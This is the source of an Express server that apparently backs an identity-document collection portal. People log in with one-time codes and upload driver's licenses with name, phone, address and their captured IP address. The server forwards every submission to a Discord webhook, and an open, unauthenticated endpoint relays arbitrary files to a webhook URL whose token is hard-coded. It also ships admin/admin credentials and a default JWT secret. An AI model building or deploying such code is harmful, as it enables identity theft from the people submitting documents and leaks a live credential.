import fs from "fs";
import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import jwt from "jsonwebtoken";

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" })); // for base64 file uploads

const JWT_SECRET = process.env.JWT_SECRET || "default_insecure_secret_for_demo";

// Mock Database
const admins = [
  { id: "admin-1", username: "admin", password: "admin", role: "admin" },
];


const DATA_FILE = path.join(process.cwd(), "data.json");

let accessCodes = ["108026"]; // Initially one 6-digit code for demo
let documents: any[] = [];

function loadData() {
  if (fs.existsSync(DATA_FILE)) {
    try {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
      if (data.accessCodes) accessCodes = data.accessCodes;
      if (data.documents) documents = data.documents;
    } catch (e) {
      console.error("Error loading data", e);
    }
  } else {
    saveData();
  }
}

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ accessCodes, documents }));
  } catch (e) {
    console.error("Error saving data", e);
  }
}

loadData(); // Load on startup


// Authentication Middleware
const authenticateToken = (req: any, res: any, next: any) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (token == null) return res.sendStatus(401);

  jwt.verify(token, JWT_SECRET, (err: any, user: any) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
};

const requireAdmin = (req: any, res: any, next: any) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ error: "Admin access required" });
  }
  next();
};

// API Routes

// Discord Webhook Proxy
app.post("/api/discord", async (req: any, res: any) => {
  const { message, fileUrl, fileName } = req.body;
  const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1527029251549692005/Eq-uDFflxj8qBScKHfpPFPPImPt2D-j7tz0ZUGI-dSc_ppcGWObQmWeJn5erZbBkgsgYK";

  if (!discordWebhookUrl) {
    return res.status(500).json({ error: "Discord Webhook URL not configured" });
  }

  try {
    const form = new FormData();
    form.append("content", message || "New Submission");

    if (fileUrl) {
      const match = fileUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
      if (match) {
        const mimeType = match[1];
        const buffer = Buffer.from(match[2], 'base64');
        const blob = new Blob([buffer], { type: mimeType });
        form.append("file", blob, fileName || "document.bin");
      }
    }

    const discordRes = await fetch(discordWebhookUrl, {
      method: "POST",
      body: form as any
    });

    if (!discordRes.ok) {
      const responseText = await discordRes.text();
      console.error("Discord response error:", discordRes.status, responseText);
      return res.status(discordRes.status).json({ error: "Discord error", details: responseText });
    }

    return res.json({ success: true });
  } catch (error: any) {
    console.error("Error proxying to Discord:", error);
    return res.status(500).json({ error: error.message });
  }
});

// Employee login via Access Code
app.post("/api/auth/employee-login", (req, res) => {
  const { accessCode } = req.body;
  
  if (!accessCode) {
    return res.status(400).json({ error: "Access code is required" });
  }

  if (!accessCodes.includes(accessCode)) {
    return res.status(401).json({ error: "Invalid access code" });
  }

  // Remove the access code so it is only for one-time use
  accessCodes = accessCodes.filter(code => code !== accessCode);
  saveData();

  const token = jwt.sign({ id: `emp_${accessCode}`, username: `Employee (${accessCode})`, role: "employee" }, JWT_SECRET, { expiresIn: "24h" });
  res.json({ token, user: { id: `emp_${accessCode}`, username: `Employee (${accessCode})`, role: "employee" } });
});

// Admin login
app.post("/api/auth/admin-login", (req, res) => {
  const { username, password } = req.body;
  const admin = admins.find(u => u.username === username && u.password === password);
  
  if (!admin) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const token = jwt.sign({ id: admin.id, username: admin.username, role: admin.role }, JWT_SECRET, { expiresIn: "24h" });
  res.json({ token, user: { id: admin.id, username: admin.username, role: admin.role } });
});

// Employee: Get my documents
app.get("/api/documents/me", authenticateToken, (req: any, res) => {
  const myDocs = documents.filter(d => d.userId === req.user.id);
  // Do not send back base64 string for listing to save bandwidth
  res.json(myDocs.map(({ fileUrl, ...doc }) => doc));
});

// Employee: Submit a document
app.post("/api/documents", authenticateToken, (req: any, res) => {
  const { title, fileUrl, fullName, phoneNumber, streetAddress, zipCode } = req.body;
  
  if (!fileUrl) {
    return res.status(400).json({ error: "File is required" });
  }

  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

  const newDoc = {
    id: `doc_${Date.now()}`,
    userId: req.user.id,
    username: req.user.username,
    title: title || "Driver's License",
    fullName,
    phoneNumber,
    streetAddress,
    zipCode,
    ipAddress,
    fileUrl,
    status: "pending",
    submittedAt: new Date().toISOString()
  };

  documents.push(newDoc);
  saveData();

  // Send notification and file to Discord
  const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (discordWebhookUrl) {
    try {
      const form = new FormData();
      const message = `**New Document Submitted**\n**User:** ${req.user.username}\n**Name:** ${fullName || 'N/A'}\n**Phone:** ${phoneNumber || 'N/A'}\n**Address:** ${streetAddress || 'N/A'}, ${zipCode || 'N/A'}`;
      form.append('content', message);
      
      const match = fileUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
      if (match) {
        const mimeType = match[1];
        const buffer = Buffer.from(match[2], 'base64');
        const blob = new Blob([buffer], { type: mimeType });
        let extension = 'bin';
        if (mimeType.includes('png')) extension = 'png';
        else if (mimeType.includes('jpeg') || mimeType.includes('jpg')) extension = 'jpg';
        else if (mimeType.includes('pdf')) extension = 'pdf';
        
        form.append('file', blob, `document.${extension}`);
      }

      fetch(discordWebhookUrl, {
        method: 'POST',
        body: form as any
      }).then(discordRes => {
        if (!discordRes.ok) console.error("Discord webhook responded with status:", discordRes.status);
      }).catch(err => console.error("Discord webhook fetch error:", err));
    } catch (e) {
      console.error("Error formatting Discord webhook payload", e);
    }
  }

  res.status(201).json({ success: true, docId: newDoc.id });
});

// Admin: Get all documents
app.get("/api/admin/documents", authenticateToken, requireAdmin, (req: any, res) => {
  res.json(documents.map(({ fileUrl, ...doc }) => doc));
});

// Admin: Get document details (including fileUrl)
app.get("/api/admin/documents/:id", authenticateToken, requireAdmin, (req: any, res) => {
  const doc = documents.find(d => d.id === req.params.id);
  if (!doc) return res.status(404).json({ error: "Document not found" });
  res.json(doc);
});

// Admin: Update document status
app.patch("/api/admin/documents/:id/status", authenticateToken, requireAdmin, (req: any, res) => {
  const { status } = req.body;
  if (!['approved', 'rejected'].includes(status)) {
    return res.status(400).json({ error: "Invalid status" });
  }

  const doc = documents.find(d => d.id === req.params.id);
  if (!doc) return res.status(404).json({ error: "Document not found" });

  doc.status = status;
  saveData();
  res.json({ success: true, doc });
});

// Admin: Get all unused access codes
app.get("/api/admin/access-codes", authenticateToken, requireAdmin, (req: any, res) => {
  res.json({ codes: accessCodes });
});

// Admin: Generate new access code
app.post("/api/admin/access-codes", authenticateToken, requireAdmin, (req: any, res) => {
  const newCode = Math.floor(100000 + Math.random() * 900000).toString();
  accessCodes.push(newCode);
  saveData();
  res.status(201).json({ code: newCode });
});


async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
